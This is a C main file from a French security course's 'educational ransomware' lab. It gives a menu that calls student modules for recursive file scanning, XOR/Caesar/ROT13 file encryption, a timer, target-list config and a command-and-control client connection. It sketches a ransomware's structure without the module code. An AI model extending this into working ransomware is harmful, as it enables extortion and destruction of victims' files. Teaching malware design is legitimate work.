/* 
 * Ransomware Éducatif - Jour 5
 * 
 * Ce programme intègre tous les modules développés pendant le TP.
 * Les étudiants doivent implémenter chaque module (.c) puis tester
 * l'intégration complète avec ce fichier principal.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "scanner.h"
#include "xor_crypto.h"
#include "caesar_crypto.h"
#include "rot13_crypto.h"
#include "checksum.h"
#include "timer.h"
#include "config.h"
#include "c2_client.h"

void print_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║   RANSOMWARE ÉDUCATIF - JOUR 5           ║\n");
    printf("║   Formation Sécurité Informatique        ║\n");
    printf("╚══════════════════════════════════════════╝\n");
    printf("\n");
}

void print_menu() {
    printf("\n=== MENU PRINCIPAL ===\n");
    printf("1. Scanner un répertoire\n");
    printf("2. Chiffrer XOR\n");
    printf("3. Chiffrer César\n");
    printf("4. Chiffrer ROT13\n");
    printf("5. Calculer checksum\n");
    printf("6. Tester timer\n");
    printf("7. Charger config\n");
    printf("8. Tester C2 client\n");
    printf("0. Quitter\n");
    printf("Choix: ");
}

int main() {
    print_banner();
    
    int choice;
    char path[MAX_PATH];
    char input[MAX_PATH];
    char output[MAX_PATH];
    char key[128];
    int shift;
    
    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) {
            printf("Erreur de saisie\n");
            while (getchar() != '\n');
            continue;
        }
        getchar(); // Consommer le \n
        
        switch (choice) {
            case 1: // Scanner
                printf("Chemin à scanner: ");
                fgets(path, sizeof(path), stdin);
                path[strcspn(path, "\n")] = 0;
                
                // Allouer dynamiquement pour éviter stack overflow
                char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
                if (!files) {
                    printf("✗ Erreur allocation mémoire\n");
                    break;
                }
                
                int count = scan_recursive(path, files, MAX_FILES, 0);
                printf("\n✓ %d fichiers trouvés\n", count);
                
                // Afficher les 10 premiers
                for (int i = 0; i < count && i < 10; i++) {
                    printf("  - %s\n", files[i]);
                }
                if (count > 10) printf("  ... et %d autres\n", count - 10);
                
                free(files);
                break;
                
            case 2: // XOR
                printf("Fichier source: ");
                fgets(input, sizeof(input), stdin);
                input[strcspn(input, "\n")] = 0;
                
                printf("Fichier destination: ");
                fgets(output, sizeof(output), stdin);
                output[strcspn(output, "\n")] = 0;
                
                printf("Clé XOR: ");
                fgets(key, sizeof(key), stdin);
                key[strcspn(key, "\n")] = 0;
                
                if (xor_encrypt_file(input, output, key) == 0) {
                    printf("✓ Chiffrement XOR réussi\n");
                } else {
                    printf("✗ Erreur de chiffrement\n");
                }
                break;
                
            case 3: // César
                printf("Fichier source: ");
                fgets(input, sizeof(input), stdin);
                input[strcspn(input, "\n")] = 0;
                
                printf("Fichier destination: ");
                fgets(output, sizeof(output), stdin);
                output[strcspn(output, "\n")] = 0;
                
                printf("Décalage (1-25): ");
                scanf("%d", &shift);
                getchar();
                
                if (caesar_encrypt_file(input, output, shift) == 0) {
                    printf("✓ Chiffrement César réussi\n");
                } else {
                    printf("✗ Erreur de chiffrement\n");
                }
                break;
                
            case 4: // ROT13
                printf("Fichier source: ");
                fgets(input, sizeof(input), stdin);
                input[strcspn(input, "\n")] = 0;
                
                printf("Fichier destination: ");
                fgets(output, sizeof(output), stdin);
                output[strcspn(output, "\n")] = 0;
                
                if (rot13_file(input, output) == 0) {
                    printf("✓ ROT13 réussi\n");
                } else {
                    printf("✗ Erreur\n");
                }
                break;
                
            case 5: // Checksum
                printf("Fichier à analyser: ");
                fgets(input, sizeof(input), stdin);
                input[strcspn(input, "\n")] = 0;
                
                uint32_t crc = calculate_crc32(input);
                printf("✓ CRC32: 0x%08X\n", crc);
                break;
                
            case 6: // Timer
                printf("Attendre combien de secondes ? ");
                int seconds;
                scanf("%d", &seconds);
                getchar();
                
                printf("Attente de %d secondes...\n", seconds);
                wait_seconds(seconds);
                printf("✓ Terminé\n");
                break;
                
            case 7: // Config
                printf("Fichier config (default: config.txt): ");
                fgets(path, sizeof(path), stdin);
                path[strcspn(path, "\n")] = 0;
                
                if (strlen(path) == 0) {
                    strcpy(path, "config.txt");
                }
                
                Config *cfg = load_config(path);
                if (cfg) {
                    printf("✓ Config chargée\n");
                    printf("  Whitelist: %d entrées\n", cfg->whitelist_count);
                    printf("  Blacklist: %d entrées\n", cfg->blacklist_count);
                    free_config(cfg);
                } else {
                    printf("✗ Erreur de chargement\n");
                }
                break;
                
            case 8: // C2 Client
                printf("Test connexion au C2...\n");
                int sock = c2_connect(C2_SERVER_IP, C2_SERVER_PORT);
                if (sock < 0) {
                    printf("✗ Connexion échouée\n");
                } else {
                    printf("✓ Connecté au serveur C2\n");
                    
                    C2Command cmd;
                    memset(&cmd, 0, sizeof(cmd));
                    strcpy(cmd.command, "STATUS");
                    
                    C2Response resp = c2_send_command(sock, &cmd);
                    printf("Réponse: %s\n", resp.message);
                    
                    c2_disconnect(sock);
                }
                break;
                
            case 0: // Quitter
                printf("Au revoir !\n");
                return 0;
                
            default:
                printf("Choix invalide\n");
        }
    }
    
    return 0;
}
